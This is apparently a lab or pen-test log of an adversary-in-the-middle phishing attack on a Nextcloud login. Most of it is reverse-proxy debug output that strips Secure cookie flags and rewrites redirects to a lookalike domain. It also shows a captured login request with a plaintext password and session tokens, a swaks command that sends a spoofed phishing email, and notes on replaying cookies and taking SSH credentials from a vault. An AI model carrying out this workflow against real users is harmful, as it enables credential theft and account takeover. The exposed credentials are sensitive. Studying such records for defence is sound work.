[Sat Dec 12 18:18:01 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPRequest took 992ns
[Sat Dec 12 18:18:01 2020]  DBG  rewriteRequest took 181.491µs
[Sat Dec 12 18:18:01 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPRequest took 989ns
[Sat Dec 12 18:18:01 2020]  DBG  rewriteRequest took 45.928µs
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Set-Cookie Flags: from
[oc3sau9x3hp8=hvm2m2vd2blm1ukr396f263r4t; path=/; secure; HttpOnly]
 -->
[oc3sau9x3hp8=hvm2m2vd2blm1ukr396f263r4t; path=/; ; HttpOnly]
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Set-Cookie Flags: from
[oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0; path=/; secure; HttpOnly]
 -->
[oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0; path=/; ; HttpOnly]
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Set-Cookie Flags: from
[__Host-nc_sameSiteCookielax=true; path=/; httponly;secure; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=lax]
 -->
[__Host-nc_sameSiteCookielax=true; path=/; httponly;; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=lax]
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Set-Cookie Flags: from
[__Host-nc_sameSiteCookiestrict=true; path=/; httponly;secure; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=strict]
 -->
[__Host-nc_sameSiteCookiestrict=true; path=/; httponly;; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=strict]
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Location Header [https://nextcloud.0x0security.com/index.php/login] to [https://nextcloud.00security.com/index.php/login]
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPResponse took 235.693µs
[Sat Dec 12 18:18:01 2020]  DBG  Fallback to default compression ()
[Sat Dec 12 18:18:01 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[302] type[text/html; charset=UTF-8] encoding[] uncompressedBody[0 bytes]
[Sat Dec 12 18:18:01 2020]  DBG  rewriteResponse took 332.907µs
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Set-Cookie Flags: from
[oc3sau9x3hp8=rmg4l41784bvbi1kik8hr3r2di; path=/; secure; HttpOnly]
 -->
[oc3sau9x3hp8=rmg4l41784bvbi1kik8hr3r2di; path=/; ; HttpOnly]
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Set-Cookie Flags: from
[oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F; path=/; secure; HttpOnly]
 -->
[oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F; path=/; ; HttpOnly]
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Set-Cookie Flags: from
[__Host-nc_sameSiteCookielax=true; path=/; httponly;secure; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=lax]
 -->
[__Host-nc_sameSiteCookielax=true; path=/; httponly;; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=lax]
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Set-Cookie Flags: from
[__Host-nc_sameSiteCookiestrict=true; path=/; httponly;secure; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=strict]
 -->
[__Host-nc_sameSiteCookiestrict=true; path=/; httponly;; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=strict]
[Sat Dec 12 18:18:01 2020]  DBG  Rewriting Location Header [https://nextcloud.0x0security.com/index.php/login] to [https://nextcloud.00security.com/index.php/login]
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPResponse took 1.837502ms
[Sat Dec 12 18:18:01 2020]  DBG  Fallback to default compression ()
[Sat Dec 12 18:18:01 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[302] type[text/html; charset=UTF-8] encoding[] uncompressedBody[0 bytes]
[Sat Dec 12 18:18:01 2020]  DBG  rewriteResponse took 2.280018ms
[Sat Dec 12 18:18:01 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:01 2020]  DBG  Patching request Cookies [oc3sau9x3hp8=hvm2m2vd2blm1ukr396f263r4t; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true] -> [oc3sau9x3hp8=hvm2m2vd2blm1ukr396f263r4t; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true]
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPRequest took 58.065µs
[Sat Dec 12 18:18:01 2020]  DBG  rewriteRequest took 89.138µs
[Sat Dec 12 18:18:01 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:01 2020]  DBG  Patching request Cookies [oc3sau9x3hp8=rmg4l41784bvbi1kik8hr3r2di; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true] -> [oc3sau9x3hp8=rmg4l41784bvbi1kik8hr3r2di; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true]
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPRequest took 60.269µs
[Sat Dec 12 18:18:01 2020]  DBG  rewriteRequest took 91.82µs
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPResponse took 5.43µs
[Sat Dec 12 18:18:01 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[200] type[text/html; charset=UTF-8] encoding[gzip] uncompressedBody[5529 bytes]
[Sat Dec 12 18:18:01 2020]  DBG  rewriteResponse took 2.140479ms
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPResponse took 2.844µs
[Sat Dec 12 18:18:01 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[200] type[text/html; charset=UTF-8] encoding[gzip] uncompressedBody[5529 bytes]
[Sat Dec 12 18:18:01 2020]  DBG  rewriteResponse took 2.217783ms
[Sat Dec 12 18:18:01 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:01 2020]  DBG  Patching request Cookies [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=rmg4l41784bvbi1kik8hr3r2di; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F] -> [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=rmg4l41784bvbi1kik8hr3r2di; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F]
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPRequest took 71.792µs
[Sat Dec 12 18:18:01 2020]  DBG  rewriteRequest took 162.678µs
[Sat Dec 12 18:18:01 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:01 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:01 2020]  DBG  Patching request Cookies [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=hvm2m2vd2blm1ukr396f263r4t; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0] -> [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=hvm2m2vd2blm1ukr396f263r4t; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0]
[Sat Dec 12 18:18:01 2020]  DBG  PatchHeaders: HTTPRequest took 194.039µs
[Sat Dec 12 18:18:01 2020]  DBG  rewriteRequest took 400.855µs
[Sat Dec 12 18:18:02 2020]  DBG  Rewriting Set-Cookie Flags: from
[oc3sau9x3hp8=r46u113863jmb3bbv4apleneu4; path=/; secure; HttpOnly]
 -->
[oc3sau9x3hp8=r46u113863jmb3bbv4apleneu4; path=/; ; HttpOnly]
[Sat Dec 12 18:18:02 2020]  DBG  Rewriting Location Header [/index.php/login/selectchallenge] to [/index.php/login/selectchallenge]
[Sat Dec 12 18:18:02 2020]  DBG  PatchHeaders: HTTPResponse took 195.825µs
[Sat Dec 12 18:18:02 2020]  DBG  Fallback to default compression ()
[Sat Dec 12 18:18:02 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[303] type[text/html; charset=UTF-8] encoding[] uncompressedBody[0 bytes]
[Sat Dec 12 18:18:02 2020]  DBG  rewriteResponse took 327.823µs
[Sat Dec 12 18:18:02 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:02 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:02 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:02 2020]  DBG  Patching request Cookies [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=r46u113863jmb3bbv4apleneu4; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F] -> [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=r46u113863jmb3bbv4apleneu4; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F]
[Sat Dec 12 18:18:02 2020]  DBG  PatchHeaders: HTTPRequest took 65.075µs
[Sat Dec 12 18:18:02 2020]  DBG  rewriteRequest took 98.133µs
[Sat Dec 12 18:18:02 2020]  DBG  Rewriting Set-Cookie Flags: from
[oc3sau9x3hp8=7kgjfglbpbmieel3h5obr5qujf; path=/; secure; HttpOnly]
 -->
[oc3sau9x3hp8=7kgjfglbpbmieel3h5obr5qujf; path=/; ; HttpOnly]
[Sat Dec 12 18:18:02 2020]  DBG  Rewriting Location Header [/index.php/login/selectchallenge] to [/index.php/login/selectchallenge]
[Sat Dec 12 18:18:02 2020]  DBG  PatchHeaders: HTTPResponse took 92.806µs
[Sat Dec 12 18:18:02 2020]  DBG  Fallback to default compression ()
[Sat Dec 12 18:18:02 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[303] type[text/html; charset=UTF-8] encoding[] uncompressedBody[0 bytes]
[Sat Dec 12 18:18:02 2020]  DBG  rewriteResponse took 143.639µs
[Sat Dec 12 18:18:02 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:02 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:02 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:02 2020]  DBG  Patching request Cookies [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=7kgjfglbpbmieel3h5obr5qujf; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0] -> [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=7kgjfglbpbmieel3h5obr5qujf; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0]
[Sat Dec 12 18:18:02 2020]  DBG  PatchHeaders: HTTPRequest took 85.492µs
[Sat Dec 12 18:18:02 2020]  DBG  rewriteRequest took 133.043µs
[Sat Dec 12 18:18:03 2020]  DBG  PatchHeaders: HTTPResponse took 4.633µs
[Sat Dec 12 18:18:03 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[200] type[text/html; charset=UTF-8] encoding[gzip] uncompressedBody[5287 bytes]
[Sat Dec 12 18:18:03 2020]  DBG  rewriteResponse took 1.763702ms
[Sat Dec 12 18:18:03 2020]  DBG  PatchHeaders: HTTPResponse took 5.065µs
[Sat Dec 12 18:18:03 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[200] type[text/html; charset=UTF-8] encoding[gzip] uncompressedBody[5289 bytes]
[Sat Dec 12 18:18:03 2020]  DBG  rewriteResponse took 1.941906ms
[Sat Dec 12 18:18:03 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:03 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:03 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:03 2020]  DBG  Patching request Cookies [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=r46u113863jmb3bbv4apleneu4; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F] -> [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=r46u113863jmb3bbv4apleneu4; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F]
[Sat Dec 12 18:18:03 2020]  DBG  PatchHeaders: HTTPRequest took 99.549µs
[Sat Dec 12 18:18:03 2020]  DBG  rewriteRequest took 211.693µs
[Sat Dec 12 18:18:03 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:03 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:03 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:03 2020]  DBG  Patching request Cookies [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=7kgjfglbpbmieel3h5obr5qujf; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0] -> [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=7kgjfglbpbmieel3h5obr5qujf; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0]
[Sat Dec 12 18:18:03 2020]  DBG  PatchHeaders: HTTPRequest took 99.624µs
[Sat Dec 12 18:18:03 2020]  DBG  rewriteRequest took 219.679µs
[Sat Dec 12 18:18:03 2020]  DBG  Rewriting Location Header [/index.php/login/challenge/admin] to [/index.php/login/challenge/admin]
[Sat Dec 12 18:18:03 2020]  DBG  PatchHeaders: HTTPResponse took 69.902µs
[Sat Dec 12 18:18:03 2020]  DBG  Fallback to default compression ()
[Sat Dec 12 18:18:03 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[303] type[text/html; charset=UTF-8] encoding[] uncompressedBody[0 bytes]
[Sat Dec 12 18:18:03 2020]  DBG  rewriteResponse took 190.962µs
[Sat Dec 12 18:18:03 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:03 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:03 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:03 2020]  DBG  Patching request Cookies [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=r46u113863jmb3bbv4apleneu4; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F] -> [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=r46u113863jmb3bbv4apleneu4; oc_sessionPassphrase=KVmkalxc3i3t4y243nUPptvkVL%2F6iauX%2Fihgp1t4VrVt9g1s7FC3coG9zUQYvQUFmSmgIef4YapYjToJ6V0kaVDjvRHy9tem%2FtB78uir8osITI7rKvdu5IPyuL7m0n5F]
[Sat Dec 12 18:18:03 2020]  DBG  PatchHeaders: HTTPRequest took 72.998µs
[Sat Dec 12 18:18:03 2020]  DBG  rewriteRequest took 125.726µs
[Sat Dec 12 18:18:03 2020]  DBG  Rewriting Set-Cookie Flags: from
[nc_username=robert; Path=/; Max-Age=1296000; Secure; HttpOnly; SameSite=Lax]
 -->
[nc_username=robert; Path=/; Max-Age=1296000; ; HttpOnly; SameSite=Lax]
[Sat Dec 12 18:18:03 2020]  DBG  Rewriting Set-Cookie Flags: from
[nc_token=E6jL0LLGnij312QqB%2BCC5pi1xVdudoud; Path=/; Max-Age=1296000; Secure; HttpOnly; SameSite=Lax]
 -->
[nc_token=E6jL0LLGnij312QqB%2BCC5pi1xVdudoud; Path=/; Max-Age=1296000; ; HttpOnly; SameSite=Lax]
[Sat Dec 12 18:18:03 2020]  DBG  Rewriting Set-Cookie Flags: from
[nc_session_id=7kgjfglbpbmieel3h5obr5qujf; Path=/; Max-Age=1296000; Secure; HttpOnly; SameSite=Lax]
 -->
[nc_session_id=7kgjfglbpbmieel3h5obr5qujf; Path=/; Max-Age=1296000; ; HttpOnly; SameSite=Lax]
[Sat Dec 12 18:18:03 2020]  DBG  Rewriting Location Header [https://nextcloud.0x0security.com/index.php/apps/files/] to [https://nextcloud.00security.com/index.php/apps/files/]
[Sat Dec 12 18:18:03 2020]  DBG  PatchHeaders: HTTPResponse took 159.865µs
[Sat Dec 12 18:18:03 2020]  DBG  Fallback to default compression ()
[Sat Dec 12 18:18:03 2020]  DBG  [rw] Rewriting Response Body for (https://nextcloud.0x0security.com): status[303] type[text/html; charset=UTF-8] encoding[] uncompressedBody[0 bytes]
[Sat Dec 12 18:18:03 2020]  DBG  rewriteResponse took 226.037µs
[Sat Dec 12 18:18:03 2020]  DBG  Subdomain: nextcloud
[Sat Dec 12 18:18:03 2020]  DBG  Standard subdomain: nextcloud
[Sat Dec 12 18:18:03 2020]  DBG  [P] Proxying target [https://nextcloud.0x0security.com] via domain [00security.com]
[Sat Dec 12 18:18:03 2020]  DBG  Patching request Cookies [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=7kgjfglbpbmieel3h5obr5qujf; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0; nc_username=robert; nc_token=E6jL0LLGnij312QqB%2BCC5pi1xVdudoud; nc_session_id=7kgjfglbpbmieel3h5obr5qujf] -> [__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=7kgjfglbpbmieel3h5obr5qujf; oc_sessionPassphrase=cwhPE1H6%2FkyxdCXtH1vwcCQpCtCK1KKEhPF8YIMaW9sUYCvz6D1FvE9wY%2BzVd%2FD%2FrJdOEGm3KmJdTN51ltaZWvLGsxlv3o%2Bg6%2FarZBaqWv3uagLFHCkc3IEA1Bem2nl0; nc_username=robert; nc_token=E6jL0LLGnij312QqB%2BCC5pi1xVdudoud; nc_session_]
[Sat Dec 12 18:18:03 2020]  DBG  PatchHeaders: HTTPRequest took 78.845µs
[Sat Dec 12 18:18:03 2020]  DBG  rewriteRequest took 108.14µs
[Sat Dec 12 18:18:04 2020]  DBG  Rewriting Location Header [/index.php/login/selectchallenge] to [/index.php/login/selectchallenge]
[Sat Dec 12 18:18:04 2020]  DBG  PatchHeaders: HTTPResponse took 65.592µs


```


Outputting in the logs file (requests.log)

```sh
URL: https://storage.0x0security.com
======
nc_username=robert; Path=/; Max-Age=1296000; ; HttpOnly; SameSite=Lax####nc_token=lpcp%2FUMJ1bPoQPwFcFmPp0tPLeiVjETJ; Path=/; Max-Age=1296000; ; HttpOnly; SameS
ite=Lax####nc_session_id=r37vaoadc3h6isb6ecgmqn9325; Path=/; Max-Age=1296000; ; HttpOnly; SameSite=Lax
======

REQUEST
======
Timestamp: Saturday, 12-Dec-20 20:34:04 EET
======
RemoteIP: 10.10.110.50:30771
======
UUID:
======
GET /index.php/apps/files/ HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=r37vaoadc3h6isb6ecgmqn9325; oc_sessionPassphrase=U4bq%2Bh0Rf929jyND6
Atod8yJLLmIFKNg8AV53%2Fc1IzZKDrNq%2B3Ux%2F1BQYN0SeKefh67vYocV11H91Tx1XWU3MJ2%2BrPpnnwq90mY0pxvWLqt3IOo2qUJ%2BGeHKkwd9WDzh; nc_username=robert; nc_token=lpcp%2FU
MJ1bPoQPwFcFmPp0tPLeiVjETJ; nc_session_
User-Agent: python-requests/2.18.4

REQUEST
======
Timestamp: Saturday, 12-Dec-20 20:34:01 EET
======
RemoteIP: 10.10.110.50:30771
======
UUID:
======
POST /index.php/login HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded
Cookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc3sau9x3hp8=8773t261kq9sd3cqc7p6cmd9g7; oc_sessionPassphrase=U4bq%2Bh0Rf929jyND6Atod8yJLLmIFKNg8AV53%2Fc1IzZKDrNq%2B3Ux%2F1BQYN0SeKefh67vYocV11H91Tx1XWU3MJ2%2BrPpnnwq90mY0pxvWLqt3IOo2qUJ%2BGeHKkwd9WDzh
User-Agent: python-requests/2.18.4

user=robert&password=aep%21%40%23vae%24%2312ces&timezone_offset=1&timezone=Europe%2FBerlin&requesttoken=uIATAL%2Fdz6rLZ5dhLAnposkZEUZamupLMvO%2BEA%2F90oo%3D%3AysVGL%2FOU%2FcaZENk2dmewib9OVQcrqolkfL%2FwQ3ecn%2F4%3D
======



REQUEST
======
Timestamp: Saturday, 12-Dec-20 20:34:04 EET
======
RemoteIP: 10.10.110.50:30771
======
UUID:
======
GET /index.php/apps/files/ HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; nc_session_ nc_token=lpcp%2FUMJ1bPoQPwFcFmPp0tPLeiVjETJ; nc_username=robert; oc3sau9x3hp8=r37vaoadc3h6isb6ecgmqn9325; oc_sessionPassphrase=U4bq%2Bh0Rf929jyND6Atod8yJLLmIFKNg8AV53%2Fc1IzZKDrNq%2B3Ux%2F1BQYN0SeKefh67vYocV11H91Tx1XWU3MJ2%2BrPpnnwq90mY0pxvWLqt3IOo2qUJ%2BGeHKkwd9WDzh
User-Agent: python-requests/2.18.4


```









sample mailer

`swaks -to "ralph@0x0security.com" -from "robert@0x0security.com" -body "Go to https://phish.00security.com" -header "Subject: Credentials, Errors" -server 10.10.110.74`


Got nextcloud creds and cookies. Went to nextcloud.0x0secrity.com (firefox) and with cookiemanager manually edited the cookies(added above). Landed on robert's nextcloud. 

Used The following creds from requests above

```sh
# got nextcloud creds
robert : aep!@#vae$#12ces

```

Decrypted vault, got ssh credentials

```sh
sshuser :  ca!@vyhjyt@#$!@31CASDF&^*3451@WADSFewr

```

And breached the perimeter :)

